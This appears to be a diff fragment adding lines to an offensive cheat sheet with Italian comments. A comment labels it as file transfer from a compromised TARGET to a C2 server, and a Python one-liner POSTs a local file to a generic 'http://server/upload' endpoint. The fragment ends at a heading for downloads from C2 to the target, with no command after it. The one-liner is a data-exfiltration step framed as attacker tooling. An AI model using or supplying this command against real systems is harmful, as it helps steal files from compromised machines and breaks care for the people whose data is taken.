@@ -1,0 +1,5 @@
+
+# upload di un file TARGET to C2
+python3 -c "import requests; files={'file': open('percorso/del/file', 'rb')}; r=requests.post('http://server/upload', files=files); print(r.text)"
+
+# donwload di un file C2 to TARGET
